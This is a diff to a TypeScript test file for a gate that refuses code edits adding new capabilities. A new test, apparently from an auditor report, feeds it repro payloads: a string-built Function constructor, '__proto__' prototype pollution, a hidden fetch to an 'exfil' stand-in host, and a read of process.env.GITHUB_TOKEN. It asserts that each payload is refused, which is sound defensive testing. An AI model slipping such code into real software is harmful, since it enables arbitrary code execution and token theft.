@@ -13,7 +13,7 @@ import { tmpdir } from "node:os";
 import { dirname, join, resolve } from "node:path";
 import { admitRules } from "../lib/approved.ts";
 import { applyRule, RULE_KINDS, specHash, validateSpec, type RuleSpec } from "../lib/learned.ts";
-import { codeTokens, editConfinedTarget, editStatement, EXISTING_EDIT_ENV_RUNS, EXISTING_EDIT_TRIGGER, EXISTING_EDIT_VOCAB, existingEditReads, gradedTestCalls, gradeExistingEditProblem, hasComment, hermeticProblem, newGrammarProblem, parseStatements, splitBody, type CallShape } from "../lib/learned-edit-existing.ts";
+import { codeTokens, editConfinedTarget, editStatement, existingEditDetail, EXISTING_EDIT_ENV_RUNS, EXISTING_EDIT_TRIGGER, EXISTING_EDIT_VOCAB, existingEditReads, gradedTestCalls, gradeExistingEditProblem, hasComment, hermeticProblem, newGrammarProblem, parseStatements, splitBody, type CallShape } from "../lib/learned-edit-existing.ts";
 import { readManifestBytes } from "../lib/manifestparts.ts";
 import { LEARNED_CANONICAL } from "../lib/nlparse.ts";
 import { phrasingFor } from "../lib/propose.ts";
@@ -221,9 +221,9 @@ test("G1+G2 really run: the emitted test passes on the edit in every zone + loca
 test("negatives: NEW reading the clock, env, timers, randomness or local time, writing globals, or using templates is refused", () => {
   const want: [string, string][] = [
     ["if (Date.now() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_io_global: Date"],
-    ["if (process.env.X) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_io_global: process"],
-    ["setTimeout(() => 1, 1); return this.fetchImpl(url);", "edit_io_global: setTimeout"],
-    ["globalThis.x = 1; return this.fetchImpl(url);", "edit_global_write"],
+    ["if (process.env.X) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_new_capability"],
+    ["setTimeout(() => 1, 1); return this.fetchImpl(url);", "edit_new_capability"],
+    ["globalThis.x = 1; return this.fetchImpl(url);", "edit_new_capability"],
     ["if (Math.random() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_io_global"],
     ["if (new Date(0).getHours() < 0) throw new Error(\"X\"); return this.fetchImpl(url);", "edit_local_time"],
     ["return this.fetchImpl(`${url}`);", "edit_new_grammar"],
@@ -271,6 +271,35 @@ test("negatives: site, split, entry, reach, hidden state, test grammar, reflecti
   assert.equal(run(B, FILES, (p) => /^src\/storage\.storage-measure-/.test(p)).r, "new_test_path_exists");
   // two trigger lines
   assert.equal(run(B + "\n" + B.split("\n")[0]).r, "edit_trigger");
+});
+
+test("Auditor #489: no splice may add a capability the base lacked — Function ctor, prototype pollution, hidden I/O defaults (Job A + Job B)", () => {
+  // Job A: every Auditor repro is refused at the task-text gate; the control (direct global I/O) stays refused.
+  const detail = (file: string, obj: string) => existingEditDetail(SPEC.trigger, SPEC.params, obj, [{ path: file, content: REPRO[file]! }], isTest).reason;
+  const REPRO: Record<string, string> = {
+    "src/m1.ts": "export function f(n: number): number {\n  return n + 1;\n}\n",
+    "src/m2.ts": "export interface Deps { load: (k: string) => Promise<string>; fetchImpl?: typeof fetch }\nexport async function g(deps: Deps): Promise<string> {\n  return await deps.load(\"a\");\n}\n",
+    "src/m3.ts": "export interface Opts { token?: string }\nexport function h(o: Opts): string {\n  return \"x\";\n}\n",
+  };
+  // R1: build the Function constructor via a string-built "constructor" key behind `as any`
+  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"constr\", \"uctor\"].join(\"\"); const F = ((() => 0) as any)[k]; F(\"globalThis.x = 1\")(); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:cast:any");
+  // R2: Object.prototype pollution through a computed write on a non-identifier root behind `as any`
+  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with const k = [\"__pro\", \"to__\"].join(\"\"); ({} as any)[k].polluted = \"yes\"; return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:cast:any");
+  // R3: new network I/O hidden behind an injected `?? fetch` default
+  assert.equal(detail("src/m2.ts", "in g in src/m2.ts: replace statement return await deps.load(\"a\"); with const send = deps.fetchImpl ?? fetch; await send(\"https://example.invalid/exfil\"); return (await deps.load(\"b\")) + \"!\";\n- fake deps = { load: resolves(\"v\"), fetchImpl: resolves(1) }\n- expect g(deps) resolves to \"v!\""), "edit_new_capability:id:fetch");
+  // R3b: process.env read hidden behind an injected `?? process.env.X` default
+  assert.equal(detail("src/m3.ts", "in h in src/m3.ts: replace statement return \"x\"; with const t = o.token ?? process.env.GITHUB_TOKEN; return \"y\" + (t ? \"\" : \"\");\n- expect h({ token: \"t\" }) returns \"y\""), "edit_new_capability:id:process");
+  // N1 control: a bare global stays refused
+  assert.equal(detail("src/m1.ts", "in f in src/m1.ts: replace statement return n + 1; with void fetch(\"https://x\"); return n + 2;\n- expect f(1) returns 3"), "edit_new_capability:id:fetch");
+
+  // Job B: the same gate on the graded tree (base vs edited target), independent of the task text or the test content.
+  const { e } = run(B);
+  assert.ok(e);
+  const rd = (p: string) => FILES.find((f) => f.path === p)?.content ?? null;
+  const evilFetch = STORAGE.replace("return { total, count: keys.length };", "void fetch(\"https://x\"); return { total, count: keys.length };");
+  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, evilFetch, e.extra[0]!.path, e.extra[0]!.content, rd), "edit_new_capability:id:fetch");
+  const evilCast = STORAGE.replace("return { total, count: keys.length };", "const z = (keys as any)[\"length\"]; return { total, count: keys.length };");
+  assert.equal(gradeExistingEditProblem("src/storage.ts", STORAGE, evilCast, e.extra[0]!.path, e.extra[0]!.content, rd), "edit_new_capability:cast:any");
 });
 
 test("negatives: the closure is hermetic or nothing (package imports, builtins, load-time IO, extends)", () => {
